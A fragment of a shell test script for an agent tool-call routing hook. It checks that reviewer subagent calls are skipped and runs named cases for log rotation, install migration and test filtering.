for reviewer in critic qa-tester security-reviewer risk-reviewer architecture-reviewer; do
  routing_hook_case "routing: Agent reviewer $reviewer skips" \
    "{\"cwd\":\"/home/screenleon/github/pm-dispatch\",\"session_id\":\"s6\",\"tool_name\":\"Agent\",\"tool_input\":{\"subagent_type\":\"$reviewer\"}}" \
    0 ""
done
routing_missing_file_case
routing_missing_marker_case
routing_rotation_case
routing_rotation_fail_case
routing_concurrent_append_case
routing_fresh_home_no_log_dir_case
install_routing_dry_run_case
install_routing_idempotent_case
install_routing_migrates_unmarked_case
install_routing_skips_already_migrated_case
install_routing_migrator_failure_preserves_settings_case

meta_filter_runs_only_matching
meta_list_exits_zero_with_count
meta_filter_no_match_exits_nonzero

# =============================================================================
# summary
# =============================================================================
th_summary
